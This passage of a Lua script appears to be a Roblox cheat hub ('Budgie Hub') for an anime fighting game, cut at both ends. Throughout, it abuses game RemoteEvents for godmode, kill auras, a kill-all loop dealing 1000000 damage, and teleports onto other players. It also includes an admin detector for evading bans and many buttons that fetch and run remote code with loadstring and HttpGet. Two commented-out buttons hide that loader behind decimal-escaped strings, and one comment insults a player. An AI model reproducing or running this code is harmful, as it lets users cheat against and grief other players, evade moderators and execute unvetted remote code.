local selectionGui = playerGui:FindFirstChild("SelectionGui")
if selectionGui and selectionGui.Enabled == false then
  selectionGui.Enabled = true
  print("Test Function")
 end
end
   end    
})

Tab:AddButton({
 Name = "Automatic tools active",
 Callback = function()
        local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

repeat
 wait(0.4)
if character then
    local tool = character:FindFirstChildOfClass("Tool")
    if tool then
        tool:Activate()
    end
end
until character.Humanoid.Health <= 0
   end    
})

Tab:AddButton({
 Name = "Godmode",
 Callback = function()
local args = {
    [1] = "Ayanokoji Kiyotaka"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
   wait(0.3)
repeat
   task.wait()
   local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Dodge" then
       v.Parent = LP.Character
   end
end
game:GetService("Players").LocalPlayer.Character.Dodge.Skill.Event:FireServer()
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
 end    
})

Tab:AddButton({
 Name = "Fix Camera",
 Callback = function()
        speaker = game.Players.LocalPlayer
workspace.CurrentCamera:remove()
 task.wait()
 repeat wait() until speaker.Character ~= nil
 workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
 workspace.CurrentCamera.CameraType = "Custom"
 speaker.CameraMinZoomDistance = 0.5
 speaker.CameraMaxZoomDistance = 400
 speaker.CameraMode = "Classic"
 speaker.Character.Head.Anchored = false
   end    
})

Tab:AddButton({
 Name = "Auto Defrost",
 Callback = function()
        while true do
  wait()
for i, v in pairs(game:GetService("Players"):GetPlayers()) do
   task.spawn(function()
    for i, x in next, v.Character:GetDescendants() do
     if x.Name ~= floatName and x:IsA("BasePart") and x.Anchored then
      x.Anchored = false
     end
    end
   end)
end
end
   end    
})

Tab:AddButton({
 Name = "Admin Detector(Beta)",
 Callback = function()
        local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Mobile%20Friendly%20Orion')))()
local playerIds = {
    1834719600,
    3310748483,
    6004546351, -- Juvenile cunt
    5815613848,
    2706883387,
    4386335082,
    2829558814, -- Owner
}

local function checkPlayers()
    for _, player in pairs(game.Players:GetPlayers()) do
        if table.find(playerIds, player.UserId) then
            Spooky = Instance.new("Sound", game.Workspace)
            Spooky.Name = "Spooky"
            Spooky.SoundId = "rbxassetid://5304042701"
            Spooky.Volume = 2.5
            Spooky.PlaybackSpeed = 1
            Spooky.Looped = true
            Spooky:Play()
            OrionLib:MakeNotification({
                Name = "Budgie Hub | Admin Detector",
                Content = "Attention! this function has detected a player with a suspicious ID, we advise you to leave the server as soon as possible so as not to get banned!",
                Image = "rbxassetid://4483345998",
                Time = 60
            })
            return
        end
    end

    task.wait(1)
    checkPlayers()
end

checkPlayers()
   end    
})

Tab:AddButton({
 Name = "Replication Abilities",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/ReplicationAbilityes/main/Gui"))()
   end    
})

Tab:AddButton({
 Name = "Shutdown",
 Callback = function()
        OrionLib:Destroy()
   end    
})

local Section = Tab:AddSection({
 Name = "Other Functions"
})

Tab:AddToggle({
 Name = "Shoot Aura(Kenjaku)",
 Default = false,
 Callback = function(Value)
ty = Value
        while ty do
   wait(0.4)
local closestDistance = math.huge
                    local closestHumanoid = nil
                    local Usuario = game.Players.LocalPlayer

                    for _, v in pairs(workspace:GetDescendants()) do
                        if v:IsA("Humanoid") and v.RootPart and v.RootPart.Parent ~= Usuario.Character then
                            local distance =
                                (v.RootPart.Position - Usuario.Character.HumanoidRootPart.Position).magnitude
                            if distance < closestDistance and distance <= 45 then
                                closestDistance = distance
                                closestHumanoid = v
                            end
                        end
                    end

                    if closestHumanoid and closestHumanoid.Health ~= 0 then
                       local args = {
           [1] = closestHumanoid.RootPart.CFrame,
           [2] = closestHumanoid.MaxHealth
       }

 game:GetService("Players").LocalPlayer.Backpack["Mini Uzumaki"].FireServer.RemoteEvent:FireServer(unpack(args))
                    end
    end
   end    
})

local Tab = Window:MakeTab({
	Name = "Extra",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local lastPressTime = 0
Tab:AddButton({
 Name = "Kill mode",
 Callback = function()
  local currentTime = tick()
            if currentTime - lastPressTime >= 3 then
                lastPressTime = currentTime 
                for i = 1, 5 do
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MalevolentShrine"):FireServer()
end
wait()
local args = {
    [1] = "Kenjaku"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(7)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Mini Uzumaki" then
       v.Parent = LP.Character
   end
end
 
for i = 1, 50 do
wait(0.5)
        local players = game:GetService("Players"):GetPlayers()

for _, player in ipairs(players) do
    if player.Character then
        local args = {
            [1] = player.Character.HumanoidRootPart.CFrame,
            [2] = 1000000
        }

        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Mini Uzumaki").FireServer.RemoteEvent:FireServer(unpack(args))
    end
end
   end
            else
                OrionLib:MakeNotification({
 Name = "Budgie Hub",
 Content = "Too fast please wait",
 Image = "rbxassetid://4483345998",
 Time = 5
})
            end
   end    
})

Tab:AddButton({
 Name = "Killer mode",
 Callback = function()
        local args = {
    [1] = "Gyutaro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

local function onTouch()
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Rampant Rampage" then
       v.Parent = LP.Character
   end
end
    for i = 1, 1 do
        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rampant Rampage").Punch.Event:FireServer()
    end
 wait(2.5)
 local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Rampant Arc" then
       v.Parent = LP.Backpack
   end
end
end

local function stopScript()
    game:GetService("UserInputService").TouchEnded:Disconnect(onTouch)
end

local function startScript()
    game:GetService("UserInputService").TouchEnded:Connect(onTouch)
end

repeat wait() until game.Players.LocalPlayer.Character
game.Players.LocalPlayer.CharacterAdded:Connect(function()
    startScript()
end)

if game.Players.LocalPlayer.Character then
    startScript()
else
    stopScript()
end

repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 75
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Hakari abilities pack",
 Callback = function()
local function toolOne()
local tool = Instance.new("Tool")
tool.Name = "Powerful ball"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 20 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Pachinko"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolTwo()
local tool = Instance.new("Tool")
tool.Name = "To cut in half"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 15 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ShutterDoors"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolThree()
local tool = Instance.new("Tool")
tool.Name = "Powerful beating"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 10 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LuckyBeatdown"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolFour()
local tool = Instance.new("Tool")
tool.Name = "Spawn containers"
tool.RequiresHandle = false

tool.Activated:Connect(function()
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ContainerKick"):FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolFive()
local tool = Instance.new("Tool")
tool.Name = "Transformation"
tool.RequiresHandle = false

tool.Activated:Connect(function()
game:GetService("ReplicatedStorage"):WaitForChild("Domainthing"):FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolOne()
toolTwo()
toolThree()
toolFour()
toolFive()
     end
})

Tab:AddButton({
 Name = "Gojo abilities pack",
 Callback = function()
local function toolOnea()
local tool = Instance.new("Tool")
tool.Name = "Red"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 5 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Red"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolTwoa()
local tool = Instance.new("Tool")
tool.Name = "Blue"
tool.RequiresHandle = false

tool.Activated:Connect(function()
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Blue"):FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolThreea()
local tool = Instance.new("Tool")
tool.Name = "Nuclear bomb"
tool.RequiresHandle = false

tool.Activated:Connect(function()
 for i = 1, 10 do
 local args = {
    [1] = "FinalHollowPurple"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Abilitys"):WaitForChild("Gojo"):FireServer(unpack(args))
 end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolOnea()
toolTwoa()
toolThreea()
     end
})

Tab:AddButton({
 Name = "Toji abilities pack",
 Callback = function()
local function toolOne()
local tool = Instance.new("Tool")
tool.Name = "Consecutive strikes"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 7 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Punches"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolTwo()
local tool = Instance.new("Tool")
tool.Name = "Swipe"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 10 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PlayfulCloud"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolThree()
local tool = Instance.new("Tool")
tool.Name = "Death glare"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 20 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanishing"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolFour()
local tool = Instance.new("Tool")
tool.Name = "Limb rupture"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 5 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("DomainSlashes"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolFive()
local tool = Instance.new("Tool")
tool.Name = "Consecutive strikes 2"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 10 do
game:GetService("ReplicatedStorage"):WaitForChild("barrage"):WaitForChild("barrage"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

local function toolSex()
local tool = Instance.new("Tool")
tool.Name = "Fatal blows"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 3 do
game:GetService("ReplicatedStorage"):WaitForChild("barrage"):WaitForChild("jetbarrage"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolOne()
toolTwo()
toolThree()
toolFour()
toolFive()
toolSex()
    end
})

Tab:AddButton({
 Name = "Serious mode",
 Callback = function()
local function SeriousMode()
local args = {
    [1] = "Cid Kagenou"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.2)

local targetToolName = "Overdrive"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()

game:GetService("Players").LocalPlayer.Character.Overdrive:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)

local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

SeriousMode()

local args = {
    [1] = "Garou"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
local function onTouch()
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Crushed Rock" then
       v.Parent = LP.Character
   end
end
    for i = 1, 5 do
       game:GetService("Players").LocalPlayer.Character:FindFirstChild("Crushed Rock").Punch.Event:FireServer()
   end
 wait(1)
 local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Crushed Rock" then
       v.Parent = LP.Backpack
   end
end
end

local function stopScript()
    game:GetService("UserInputService").TouchEnded:Disconnect(onTouch)
end

local function startScript()
    game:GetService("UserInputService").TouchEnded:Connect(onTouch)
end

repeat wait() until game.Players.LocalPlayer.Character
game.Players.LocalPlayer.CharacterAdded:Connect(function()
    startScript()
end)

if game.Players.LocalPlayer.Character then
    startScript()
else
    stopScript()
end

repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 35
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 75
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0

local function MyWoundsAreHealed()
repeat
  wait(0.2)
  if game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 150 or game:GetService("Players").LocalPlayer.Character.Humanoid.Health < 150 then
  local args = {
    [1] = "Garou"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
  end
 until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
 end
 
 MyWoundsAreHealed()
  end
})

Tab:AddButton({
 Name = "Hyperman",
 Callback = function()
        local function SeriousMode()
local args = {
    [1] = "Cid Kagenou"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.2)

local targetToolName = "Overdrive"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()

game:GetService("Players").LocalPlayer.Character.Overdrive:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)

local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

SeriousMode()

local args = {
    [1] = "Goku Black"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

local function onTouch()
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Divine Bursttrough" then
       v.Parent = LP.Character
   end
end
    for i = 1, 8 do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Divine Bursttrough").Punch.Event:FireServer()
end
 wait(1)
 local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Divine Bursttrough" then
       v.Parent = LP.Backpack
   end
end
end

local function stopScript()
    game:GetService("UserInputService").TouchEnded:Disconnect(onTouch)
end

local function startScript()
    game:GetService("UserInputService").TouchEnded:Connect(onTouch)
end

repeat wait() until game.Players.LocalPlayer.Character
game.Players.LocalPlayer.CharacterAdded:Connect(function()
    startScript()
end)

if game.Players.LocalPlayer.Character then
    startScript()
else
    stopScript()
end

repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 35
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 75
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0

local function Hit()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function onHealthChanged(health)
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanish"):FireServer()
end

LocalPlayer.Character.Humanoid.HealthChanged:Connect(onHealthChanged)

if game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 then
LocalPlayer.Character.Humanoid.HealthChanged:Disconnect(onHealthChanged)
end
 end
 
 Hit()
 
 local function FcE()
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.E then
    local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Mortal Extinguisher" then
       v.Parent = LP.Character
   end
end
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Mortal Extinguisher").Punch.Event:FireServer()
 end
  wait(5)
local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Mortal Extinguisher" then
       v.Parent = LP.Backpack
   end
end
    end
 end)
end

FcE()
   end    
})

Tab:AddButton({
 Name = "Aura",
 Callback = function()
        local function SeriousMode()
local args = {
    [1] = "Cid Kagenou"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.2)

local targetToolName = "Overdrive"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()

game:GetService("Players").LocalPlayer.Character.Overdrive:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)

local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

SeriousMode()
   end    
})

Tab:AddButton({
 Name = "Aura v2",
 Callback = function()
        local function SeriousMode()
local args = {
    [1] = "Cid Kagenou"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.2)

local targetToolName = "Overdrive"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()

game:GetService("Players").LocalPlayer.Character.Overdrive:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)

local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

wait(0.5)
local function AuraZ()
local args = {
    [1] = "Ayanokoji Kiyotaka"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.2)
local targetToolName = "Serious"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()
wait(0.2)
game:GetService("Players").LocalPlayer.Character.Serious:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)
local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

AuraZ()
SeriousMode()
   end    
})

Tab:AddButton({
 Name = "Flash",
 Callback = function()
local args = {
    [1] = "Vergil"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/TestingSFAnMB/main/Test"))()
repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 100
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
  end    
})

Tab:AddButton({
 Name = "Mega Zoro",
 Callback = function()
        local args = {
    [1] = "Roronoa Zoro"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/MegaZoro/main/Gui"))()
repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 35
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 70
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Reaper",
 Callback = function()
local args = {
    [1] = "Asta"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Reaper/main/Gui"))()
   end
})

Tab:AddButton({
 Name = "Electro",
 Callback = function()
 local args = {
    [1] = "Green Hero"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Electro/main/Gui"))()
        repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 35
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 100
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Cursed",
 Callback = function()
 local args = {
    [1] = "Yuta Okkotsu"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Cursed/main/Gui"))()
        repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 25
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 65
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Mega Giyu",
 Callback = function()
 local args = {
    [1] = "Giyu Tomioka"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/MegaGiyu/main/Gui"))()
  local Wd = 25
repeat
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Wd
   game.Players.LocalPlayer.Character.Humanoid.JumpPower  = 65
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Denji Gui",
 Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Denji/main/Gui"))()
   end    
})

-- Tab:AddButton({
--  Name = "Server breaker(V)",
--  Callback = function()
--         loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\68\83\75\101\114\79\102\102\105\99\97\108\47\86\105\112\49\47\109\97\105\110\47\65\110\77\34\41\41\40\41\10")()
--    end    
-- })

-- Tab:AddButton({
--  Name = "Punish Player(V)",
--  Callback = function()
-- local args = {
--     [1] = "Ayanokoji Kiyotaka"
-- }

-- game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
-- loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\68\83\75\101\114\79\102\102\105\99\97\108\47\86\105\112\50\47\109\97\105\110\47\65\110\77\34\41\41\40\41\10")()
--    end    
-- })

Tab:AddButton({
 Name = "Super Rage Mode",
 Callback = function()
        local function SeriousMode()
local args = {
    [1] = "Cid Kagenou"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))

wait(0.2)

local targetToolName = "Overdrive"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()

game:GetService("Players").LocalPlayer.Character.Overdrive:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)

local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

wait(0.5)
local function AuraZ()
local args = {
    [1] = "Ayanokoji Kiyotaka"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
wait(0.2)
local targetToolName = "Serious"

local player = game.Players.LocalPlayer
local function equipTool()
    local backpack = player.Backpack
    local character = player.Character

    local targetTool = backpack:FindFirstChild(targetToolName)
    if targetTool then
        targetTool.Parent = character
    end
end

equipTool()
wait(0.2)
game:GetService("Players").LocalPlayer.Character.Serious:FindFirstChild("Full Cowl").Event:FireServer()

wait(0.3)
local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character
for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end
for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
end

AuraZ()
SeriousMode()

local function toolOne()
local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Container Cataclysm"

local isEnabled = false

local function onActivated()
    isEnabled = not isEnabled

    if not isEnabled then return end
while isEnabled and wait(0.2) do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ContainerKick"):FireServer()
  end
end

tool.Activated:Connect(onActivated)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolOne()

local function toolTwo()
local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Crowd Buster"

local isEnabled = false

local function onActivated()
    isEnabled = not isEnabled

    if not isEnabled then return end
while isEnabled and wait(0.3) do
for i = 1, 10 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanishing"):FireServer()
end
  end
end

tool.Activated:Connect(onActivated)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolTwo()

local function toolThree()
local tool = Instance.new("Tool")
tool.Name = "Bloodlust"
tool.RequiresHandle = false

tool.Activated:Connect(function()
local count = 0
last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
for i = 1, 15 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("DomainSlashes"):FireServer()
end
repeat
count = count + 1
    local players = game.Players:GetPlayers()
    local randomPlayer = players[math.random(1, #players)]
    
    if randomPlayer ~= game.Players.LocalPlayer then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = randomPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -2, 0)
    end
    
    wait()
until count == 60
wait(0.2)

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolThree()

local function toolFour()
local tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Strikes of the Gods"

local isEnabled = false

local function onActivated()
    isEnabled = not isEnabled

    if not isEnabled then return end
while isEnabled and wait(0.) do
for i = 1, 1 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Punches"):FireServer()
end
  end
end

tool.Activated:Connect(onActivated)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolFour()

local function toolSeven()
local tool = Instance.new("Tool")
tool.Name = "Plasma"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 20 do
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Blue"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolSeven()

local function toolFive()
local tool = Instance.new("Tool")
tool.Name = "Big Bang"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 25 do
 local args = {
    [1] = "FinalHollowPurple"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Abilitys"):WaitForChild("Gojo"):FireServer(unpack(args))
 end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolFive()

local function toolSix()
local tool = Instance.new("Tool")
tool.Name = "Domain of Death"
tool.RequiresHandle = false

tool.Activated:Connect(function()
for i = 1, 5 do
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("MalevolentShrine"):FireServer()
end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
end

toolSix()
   end    
})

Tab:AddButton({
 Name = "Gojo Infinity Void",
 Callback = function()
        local player = game.Players.LocalPlayer

local hasTool = false
for _, tool in ipairs(player.Backpack:GetChildren()) do
    if tool.Name == "Infinity Void" then
